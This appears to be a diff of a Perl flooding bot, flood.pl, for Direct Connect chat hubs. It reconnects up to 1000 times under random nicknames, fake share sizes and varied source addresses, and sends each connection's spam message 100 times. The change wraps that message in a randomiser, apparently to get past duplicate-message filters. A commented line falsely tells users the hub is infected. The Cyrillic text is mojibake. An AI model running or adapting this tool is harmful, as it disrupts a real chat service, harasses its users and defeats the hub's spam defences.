@@ -43,29 +43,29 @@ sub rand_int {
 
 sub rand_char {
   my ( $from, $to ) = @_;
-#perl -e "print chr($_) for (32+65..32+65+25)"  
-  $from ||= 32+65;
-  $to ||= 32+65+25;
-  return chr(rand_int($from, $to));
+  #perl -e "print chr($_) for (32+65..32+65+25)"
+  $from ||= 32 + 65;
+  $to   ||= 32 + 65 + 25;
+  return chr( rand_int( $from, $to ) );
 }
 
-sub rand_str{
+sub rand_str {
   my ( $len, $from, $to ) = @_;
   $len ||= 10;
   my $ret;
-  $ret.=rand_char($from, $to) for(0..$len);
+  $ret .= rand_char( $from, $to ) for ( 0 .. $len );
   return $ret;
 }
 
 sub rand_str_ex {
- my ($str, $chg) = @_;
- $chg ||= int (length($str) / 10);
- local @_ = split(//, $str);
- for(0..$chg){
- $_[rand scalar @_] = rand_char();
- }
+  my ( $str, $chg ) = @_;
+  $chg ||= int( length($str) / 10 );
+  local @_ = split( //, $str );
+  for ( 0 .. $chg ) {
+    $_[ rand scalar @_ ] = rand_char();
+  }
+  return join '', @_;
 }
-
 print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
 #for my $ipc ( map { @$_ } fisher_yates_shuffle( [ 230 .. 250 ] ) ) {
@@ -84,12 +84,11 @@ TRY: for ( 0 .. 1000 ) {
   my $dc = dcppp::clihub->new(
     'host' => $1,
     ( $2 ? ( 'port' => $2 ) : () ),
-#    'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
-    'Nick' => ( $ARGV[1] or rand_str(rand_int(1,10))),
-
+    #    'Nick' => ( $ARGV[1] or 'z' . int( rand(100000000) ) ) . 'x',
+    'Nick' => ( $ARGV[1] or rand_str( rand_int( 1, 10 ) ) ),
     #   'Nick'		=>	'xxxx',
-#    'sharesize' => int( rand 10000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
-    'sharesize' => rand_int(1,10000000000000),
+    #    'sharesize' => int( rand 10000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
+    'sharesize' => rand_int( 1, 10000000000000 ),
     #   'log'		=>	sub {},	# no logging
     #    'log'		=>	sub {return if $_[0] =~ /dbg|dmp/},	# no logging
     #   'min_chat_delay'	=> 0.401,
@@ -99,8 +98,7 @@ TRY: for ( 0 .. 1000 ) {
     'description' => '',
     'M'           => 'P',
     'sockopts'    => { 'LocalAddr' => "10.131.$ipc.$ipd" },
-    'Version'          => rand_int(1,1000),
-
+    'Version'     => rand_int( 1, 1000 ),
   );
   if_del(), next if !$dc->{'socket'};
   #      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!' );
@@ -109,18 +107,22 @@ TRY: for ( 0 .. 1000 ) {
     $dc->recv();
     sleep(1);
   }
+  $dc->recv(), sleep(1) for ( 1 .. 10 );
   for ( 1 .. 100 ) {
     last if !$dc->{'socket'} or $dc->{'status'} ne 'connected';
     print("BOT SEND all\n"),
 #      $dc->cmd( 'chatline', 'Ќа–оƒ, ѕр»гЋаЎа≈м ¬а— Ќа ѕр»кќл№нџй хјб 10. 139. 24 .136  !!! ¬аћ ¬с≈гƒа –аƒ HUB -=NEW-CITY=-, Ќе «аЅуƒь“е ƒоЅа¬и“ь в »зЅрјннќе!!' );
 #      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!'. $_);
-      $dc->cmd( 'chatline',
+      $dc->cmd(
+      'chatline',
+      rand_str_ex(
 'ƒоброго времени суток! ѕользу€сь случаем, хотим попросить ¬ас больше никогда не рекламировать свой хаб где попало. —пасибо. '
-        . $_ 
-. ':O:hmph::arrow::}:brow::no::(:\'(:idea:_\m/|-Om/_/:geek::geek::yes:O_O:):umm::?::sick::fear::ahoy::whistle::satan:'
+          . $_
+          . ':O:hmph::arrow::}:brow::no::(:\'(:idea:_\m/|-Om/_/:geek::geek::yes:O_O:):umm::?::sick::fear::ahoy::whistle::satan:'
 #.':D:P:!::blush::w00t::errm::x;):omg:>_<:lol::roll::heart::S:sulk::naughty:(H):whatever::|:-p:crego::biggrin::sketchy::martini:'
-	);
-        sleep(2);
+      )
+      );
+    sleep(2);
   }
   #    print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, 'HUB за ражен виру сом сро чно поки ньте его!' )
   #      for keys %{ $dc->{'NickList'} };
